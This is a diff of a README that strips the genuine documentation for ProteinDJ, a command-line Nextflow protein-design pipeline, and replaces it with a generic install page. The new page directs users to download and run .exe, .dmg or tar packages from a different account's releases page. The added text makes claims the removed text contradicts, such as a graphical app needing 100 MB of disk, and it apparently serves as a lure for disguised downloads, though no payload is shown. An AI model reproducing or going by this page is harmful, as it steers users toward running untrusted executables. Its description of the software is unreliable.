@@ -1,227 +1,86 @@
-# ProteinDJ & BindSweeper
+# 🚀 proteindj - Simplifying Protein Design for Everyone
 
-<img height="240" src="img/logo.png"><img height="240" alt="bindsweeper_logo" src="img/bindsweeper_logo.png" />
+[![Download ProteinDJ](https://img.shields.io/badge/Download%20ProteinDJ-blue.svg)](https://github.com/Mohamed5352/proteindj/releases)
 
-[BioRxiv Preprint](https://www.biorxiv.org/cgi/content/short/2025.09.24.678028v1)
+## 📋 Description
+Welcome to the official repository for the ProteinDJ protein design pipeline. This tool helps you create protein structures easily without needing deep programming skills. Whether you are a researcher or simply curious about protein design, this application guides you through the process.
 
-ProteinDJ is a Nextflow pipeline for protein design that installs and utilises multiple external software packages, including:
+## 🚀 Getting Started
+Follow the steps below to download and run ProteinDJ on your computer. No coding knowledge is required.
 
-- AlphaFold2 Initial Guess (from https://github.com/nrbennet/dl_binder_design)
-- BioPython (from https://biopython.org/)
-- Boltz-2 (from https://github.com/jwohlwend/boltz)
-- Full-Atom MPNN (from https://github.com/richardshuai/fampnn)
-- ProteinMPNN-FastRelax (from https://github.com/nrbennet/dl_binder_design)
-- RFdiffusion (from https://github.com/RosettaCommons/RFdiffusion)
-- PyRosetta (from https://www.pyrosetta.org/)
+### 1. System Requirements
+Before downloading ProteinDJ, ensure your system meets these requirements:
+- Operating System: Windows, macOS, or Linux.
+- Minimum RAM: 4 GB recommended.
+- Disk Space: At least 100 MB free.
+- Internet Connection: Required for downloading files and updates.
 
-BindSweeper provides a convenient wrapper for ProteinDJ, enabling sweeping of different parameters for binder design.
+### 2. Downloading ProteinDJ
+To download the latest version of ProteinDJ, you can visit the releases page. 
 
-If you find ProteinDJ or BindSweeper useful in your research, please [cite us](https://www.biorxiv.org/cgi/content/short/2025.09.24.678028v1) and the developers of the software listed above that make protein design pipelines like this possible. We have provided a list of citations [here](#citations).
+[Visit the releases page to download](https://github.com/Mohamed5352/proteindj/releases)
 
-> Please note: PyRosetta requires a license for commercial projects and is used extensively within ProteinDJ, AlphaFold2 Initial Guess, and ProteinMPNN-FastRelax.
+### 3. Installing ProteinDJ
+Once you have downloaded the application, follow these steps to install it:
 
-<sup>_Logo image credit: Lyn Deng, Joshua Hardy_</sup>
+- **Windows:** 
+  1. Locate the downloaded `.exe` file in your downloads folder.
+  2. Double-click the file to initiate the installation.
+  3. Follow the setup wizard to complete the installation.
 
-## Table of Contents
+- **macOS:** 
+  1. Open the `.dmg` file you downloaded.
+  2. Drag the ProteinDJ application into your Applications folder.
+  3. Eject the mounted Disk Image once installation is complete.
 
-- [Installation](#install)
-- [Using ProteinDJ](#execution)
-- [Advanced Parameters](#params)
-- [Filtering Designs](#params-filter)
-- [Metrics and Metadata](#metrics)
-- [BindSweeper](#bindsweeper)
-- [Appendices](#append)
-  - [Known limitations and planned improvements](#limitations)
-  - [Seqera Support](#seqera)
-  - [Troubleshooting and common errors](#errors)
-  - [Data used for benchmarking](#append-bench)
-  - [Citations for software packages used in ProteinDJ](#append-citations)
+- **Linux:** 
+  1. Navigate to the directory where you downloaded the package.
+  2. Run the command `tar -xvf proteindj*.tar.gz` to extract the files.
+  3. Follow the instructions in the README file included in the extracted folder for installation.
 
-## Installation <a name="install"></a>
+### 4. Running ProteinDJ
+After installation, you can start using ProteinDJ:
 
-ProteinDJ requires that [Apptainer](https://apptainer.org/docs/admin/main/installation.html) and [Nextflow](https://www.nextflow.io/docs/latest/install.html) (≥ v24.04) are installed and accessible to the path. 
+- **Windows:** 
+  1. Click on the Start Menu, and find ProteinDJ in your list of applications.
+  2. Click on it to launch.
 
-First, clone the repo for ProteinDJ:
+- **macOS:** 
+  1. Open your Applications folder and find ProteinDJ.
+  2. Click to open the application.
 
-```
-git clone https://github.com/PapenfussLab/proteindj
-cd proteindj
-```
+- **Linux:** 
+  1. Open a terminal and navigate to the directory where you installed ProteinDJ.
+  2. Type `./proteindj` to launch the application.
 
-Next, download the models for AF2, Boltz, and RFdiffusion (~15 GB) using the download script . This may take a while depending on your internet connection. Note that this only needs to be done once on a cluster as long as the files and containers are in a location that can be accessed by all users (see [Installation Guide](docs/installation.md) for more details):
+### 5. Exploring Features
+ProteinDJ comes with several useful features:
 
-```
-bash scripts/download_models.sh
-```
+- **User-Friendly Interface:** The design is straightforward, allowing anyone to use it without prior experience.
+- **Protein Structure Visualization:** See your protein designs in 3D as you create them.
+- **Export Options:** Export your designs in various formats for research or further development.
 
-Apptainer will automatically fetch containers as needed during the Nextflow run and cache them locally. If you would like to build containers locally, you can follow our [Installation Guide](docs/installation.md).
+### 6. Community and Support
+If you encounter any problems or have questions, you can reach out to our community. We offer a support system via:
 
-## Using ProteinDJ <a name="execution"></a>
+- **GitHub Issues:** Report any bugs or suggestions directly on our repository.
+- **Community Forum:** Engage with other users to ask questions and share tips.
 
-The ProteinDJ consists of four stages:
+### 7. Additional Resources
+Here are some resources to help you get the most out of ProteinDJ:
 
-1. Diffusion and Fold Design - Using RFdiffusion
-2. Sequence Design - Using ProteinMPNN or Full-Atom MPNN
-3. Structure Prediction - Using AlphaFold2 Initial Guess or Boltz-2
-4. Analysis and Reporting - Using PyRosetta and BioPython
+- **Official Documentation:** A detailed guide on how to use all features of ProteinDJ.
+- **Tutorial Videos:** Visual walkthroughs for beginners.
+- **Related Tools:** Other applications that work well in conjunction with ProteinDJ.
 
-<img src="img/pipelineoverview.png" height="200">
+### 8. Download & Install
+You can download the latest version of ProteinDJ by visiting the link below:
 
-Due to the creative nature of protein design and the complexity of RFdiffusion there are many ways you can use ProteinDJ. To help with delineating this, we have created eight RFdiffusion modes for ProteinDJ. Each mode is described in detail in our [Guide to Design Modes](docs/modes.md), but for now, here's a quick summary of each one with a simple illustration of each mode in action:
+[Download ProteinDJ](https://github.com/Mohamed5352/proteindj/releases)
 
-- **monomer_denovo** – diffusion of new monomers from noise
-- **monomer_foldcond** – diffusion of new monomers with fold-conditioning on scaffolds/templates
-- **monomer_motifscaff** – inpainting/extension of input monomers
-- **monomer_partialdiff** – partial diffusion of input monomers
-- **binder_denovo** – diffusion of new binders from noise
-- **binder_foldcond** – diffusion of new binders with fold-conditioning on scaffolds/templates
-- **binder_motifscaff** – diffusion of binding motifs in input scaffolds
-- **binder_partialdiff** – partial diffusion of a binder from an input PDB
+Follow the installation instructions based on your operating system to get started.
 
-<img src="img/modes_overview.png" height="720">
+## 📞 Contact
+For further assistance, feel free to contact us through [GitHub Discussions](https://github.com/Mohamed5352/proteindj/discussions). 
 
-All the settings and parameters for ProteinDJ can be found in the `nextflow.config` file. It contains a lot of optional parameters, but there are 4 essential parameters to pay attention to: the protein design mode (`rfd_mode`), the number of designs (`rfd_num_designs`) and sequences you want to generate (`seqs_per_design`), and the output directory path (`out_dir`).
-
-| Parameter         | Example Value      | Description                                                                                                                                                                                     |
-| ----------------- | ------------------ | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
-| `rfd_mode`        | `'monomer_denovo'` | Pipeline mode. Choose from 'monomer_denovo', 'monomer_foldcond', 'monomer_motifscaff', 'monomer_partialdiff', 'binder_denovo', 'binder_foldcond', 'binder_motifscaff', or 'binder_partialdiff'. |
-| `rfd_num_designs` | `8`                | Number of designs to generate using RFdiffusion.                                                                                                                                                |
-| `seqs_per_design` | `8`                | Number of sequences to generate per RFdiffusion design.                                                                                                                                         |
-| `out_dir`         | `'./pdj_results'`  | Output directory for results. Existing results in this directory will be overwritten.                                                                                                           |
-
-The [RFdiffusion GitHub](https://github.com/RosettaCommons/RFdiffusion/) has a comprehensive explanation of the different parameters available for RFdiffusion with examples. Note that we have externalised many RFdiffusion parameters to Nextflow and added the prefix 'rfd' e.g. `rfd_num_designs`, `rfd_input_pdb` etc. You can find a detailed description of all ProteinDJ parameters [here](docs/parameters.md).
-
-To launch a design campaign, simply run this command from the root of the `proteindj` repository:
-
-`nextflow run main.nf`
-
-This will launch the nextflow pipeline and show you progress in your terminal window. If you are running this over an ssh connection, you might want to use screen or tmux to avoid cancelling the process upon disconnect.
-
-Note that by default, this will use the parameters in `nextflow.config` file in the installation folder, but you can specify a different config file. This can be useful if you want to queue different design campaigns with alternative parameters (just be sure to specify unique output directories for each):
-
-`nextflow run main.nf -c CONFIGFILE`
-
-A helpful feature of the nextflow.config file is profiles. Profiles can be used to override parameters but are easier to edit. e.g. the
-profile for the monomer_denovo mode looks like this. We recommend using the existing profiles as a reference for each mode.
-
-```
-monomer_denovo {
-    params {
-        rfd_mode = 'monomer_denovo'
-        rfd_contigs = "[80-80]"
-        seq_method = 'fampnn'
-        pred_method = 'boltz'
-    }
-}
-```
-
-In this example, Nextflow will use all of the default parameter values from the params section except for `rfd_mode`, `rfd_contigs`, `seq_method` and `pred_method` (in this case to generate a de novo monomer 80 residues in length with RFdiffusion, Full-Atom MPNN and Boltz-2). You can use profiles by adding the `-profile` flag. e.g.
-
-`nextflow run main.nf -profile monomer_denovo`
-
-You can specify multiple profiles, for example, to combine a profile for your HPC environment (e.g. Milton at WEHI) with a design mode profile:
-
-`nextflow run main.nf -profile milton,binder_denovo`
-
-After running the pipeline, you can find all the results as well as intermediate files and logs in your specified `out_dir` organised as below:
-
-```
-out_dir/
-├── configs/              # Config files used for run
-├── inputs/               # Input files used in run e.g. PDB files for binder design
-├── run/                  # Intermediate results and log files with subfolders for each process
-├── results/              # Final results and metadata
-    ├── best_designs/     # Directory containing PDB files of designs that passed all filters
-    ├── all_designs.csv   # CSV file with metadata for all designs
-    └── best_designs.csv  # CSV file with metadata for designs that passed all filters
-└── nextflow.log          # Copy of Nextflow log from run
-```
-
-> Tip: If your run gets interrupted you can resume from the last completed step by using the -resume flag e.g. `nextflow run main.nf -profile monomer_denovo -resume`
-
-## Advanced Parameters <a name="params"></a>
-
-We have aimed to provide as much functionality as possible of the underlying software packages and there are many parameters you can adjust. Here is a [Parameter Guide](docs/parameters.md) to all of the parameters that are configurable within the `nextflow.config` file.
-
-## Filtering Designs <a name="params-filter"></a>
-
-Due to the inherently stochastic nature of protein design, often we see problematic results during the pipeline. It can save computation time to discard designs mid-pipeline that fail to meet success criteria. We have implemented three filtering stages that can be used to reject poor designs:
-
-- RFD Filtering - Filters designs according to the number of secondary structure elements and radius of gyration
-- Sequence Filtering - Filters designs according to the score of the generated sequence
-- AlphaFold2/Boltz-2 Filtering - Filters designs according to the quality of the structure prediction
-
-The most powerful predictors of experimental success are structure prediction metrics, but some metrics are more effective than others. Here are some recommended filters for binder design from the literature and their corresponding parameters in ProteinDJ:
-
-| Parameter                  | RFdiffusion paper<sup>1</sup> | AlphaProteo whitepaper<sup>2</sup> |
-| -------------------------- | --------------------- | ---------------------- |
-| af2_max_pae_interaction    | 10                    | 7                      |
-| af2_min_plddt_overall      | 80                    | 90                     |
-| af2_max_rmsd_binder_bndaln | 1                     | 1.5                    |
-
-<sup> 1. Watson, J.L. et al. Nature 620, 1089–1100 (2023). https://doi.org/10.1038/s41586-023-06415-8; 2. Zambaldi, V. et al. arXiv (2024). https://doi.org/10.48550/arXiv.2409.08022
-</sup>
-
-We recommend disabling other filters for small-scale and pilot experiments, and using these results to decide on values to use for filtering large-scale runs. We have prepared a [Filtering Guide](docs/parameters.md/#filtering-parameters) on all the filters available in ProteinDJ with recommended values for each.
-
-## Metrics and metadata <a name="metrics"></a>
-
-ProteinDJ generates and captures metadata for all designs in a CSV file '`all_designs.csv`' and the best designs if filtering is applied to '`best_designs.csv`'. See our [Metrics and Metadata Guide](docs/metrics.md) for a description of each metric.
-
-## BindSweeper <a name="bindsweeper"></a>
-
-BindSweeper is a python-based tool that can launch multiple instances of ProteinDJ to 'sweep' different binder design parameters e.g. hotspots, timesteps. For detailed information about installing and using BindSweeper, see the [BindSweeper User Guide](docs/bindsweeper.md).
-
-<img src="img/bindsweeper_workflow.png" height="500">
-
-## Appendices <a name="append"></a>
-
-### Known limitations and planned improvements <a name="limitations"></a>
-
-- Boltz-2:
-  - Currently concatenates target chain sequences, meaning predictions of targets with chain-breaks or multiple chains is problematic
-  - No option to predict target protein structure with templates
-
-### Seqera Support <a name="seqera"></a>
-
-We have designed ProteinDJ to be compatible with the [Seqera platform](https://seqera.io/platform/), so that jobs can be executed in the cloud or deployed on HPC. If you have access to Seqera, you can use the schema files in `schemas/`. There is a schema file for each mode with relevant parameters, defaults and input validation.
-
-### Troubleshooting and common errors <a name="errors"></a>
-
-`AssertionError: ('B', 134) is not in pdb file!` - A mismatch between your contigs and the input PDB file. Likely due to a chain break or an incorrect chain ID.
-
-`KeyError: 'P1L'` - A non-standard amino acid code (e.g. P1L) is present in your input PDB and included in contigs. RFdiffusion only takes natural amino acids (i.e. 'ALA','ARG','ASN','ASP','CYS','GLN','GLU','GLY','HIS','ILE','LEU','LYS','MET','PHE','PRO','SER','THR','TRP','TYR','VAL') and unknown or masked amino acids ('UNK','MAS').
-
-`Unknown variable 'metadata_ch_fold'` - We are using topic channels for metadata, and this feature is only available in Nextflow v24.04 and above. This error occurs with earlier versions of Nextflow.
-
-### Data used for benchmarking <a name="append-bench"></a>
-
-We used five structures for testing and benchmarking our pipeline.
-
-| Protein           | PDB ID | Filename       | Contigs                                                | Hotspots           |
-| ----------------- | ------ | -------------- | ------------------------------------------------------ | ------------------ |
-| Influenza A H1 HA | 5VLI   | 5vli_ha.pdb    | [A4-53/A79-83/A110-114/A261-325/0 B501-568/B580-670/0] | [B521, B545, B552] |
-| IL-7Rα            | 3DI3   | 3di3_il7ra.pdb | [B17-209/0]                                            | [B58, B80, B139]   |
-| InsR              | 4ZXB   | 4zxb_ir.pdb    | [E6-155/0]                                             | [E64, E88, E96]    |
-| PD-L1             | 5O45   | 5o45_pd-l1.pdb | [A17-131/0]                                            | [A56, A115, A123]  |
-| TrkA              | 1WWW   | 1www_trka.pdb  | [X282-382/0]                                           | [X294, X296, X333] |
-
-### Citations for software packages used in ProteinDJ <a name="append-citations"></a>
-
-ProteinDJ: a high-performance and modular protein design pipeline - Silke, D., Iskander, J., Pan, J., Thompson, A.P., Papenfuss, A.T., Lucet, I.S., Hardy, J.M. BioRxiv. https://doi.org/10.1101/2025.09.24.678028
-
-AlphaFold2 Initial Guess and ProteinMPNN-FastRelax - Bennett, N.R., Coventry, B., Goreshnik, I. et al. Improving de novo protein binder design with deep learning. Nat Commun 14, 2625 (2023). https://doi.org/10.1038/s41467-023-38328-5
-
-AlphaFold2 - Jumper, J., Evans, R., Pritzel, A. et al. Highly accurate protein structure prediction with AlphaFold. Nature 596, 583–589 (2021). https://doi.org/10.1038/s41586-021-03819-2
-
-BioPython - Cock, P. J., Antao, T. et al. Biopython: freely available Python tools for computational molecular biology and bioinformatics. Bioinformatics 25, 1422-1423, (2009). https://doi.org/10.1093/bioinformatics/btp163
-
-Boltz-2 - Wohlwend, J., et al. Boltz-2 Democratizing Biomolecular Interaction Modeling, bioRxiv 2024.11.19.624167 (2024). https://doi.org/10.1101/2024.11.19.624167
-
-Full-Atom MPNN - Shuai, R.W., et al., Sidechain conditioning and modeling for full-atom protein sequence design with FAMPNN, bioRxiv 2025.02.13.637498 (2025). https://doi.org/10.1101/2025.02.13.637498
-
-RFdiffusion - Watson, J.L., Juergens, D., Bennett, N.R. et al. De novo design of protein structure and function with RFdiffusion. Nature 620, 1089–1100 (2023). https://doi.org/10.1038/s41586-023-06415-8
-
-ProteinMPNN - Dauparas, J., et al. Robust deep learning–based protein sequence design using ProteinMPNN. Science 378, 49-56 (2022). https://doi.org/10.1126/science.add2187
-
-PyRosetta - S. Chaudhury, S. Lyskov & J. J. Gray, "PyRosetta: a script-based interface for implementing molecular modeling algorithms using Rosetta," Bioinformatics, 26(5), 689-691 (2010)
+Your feedback helps us improve. Thank you for choosing ProteinDJ for your protein design needs!
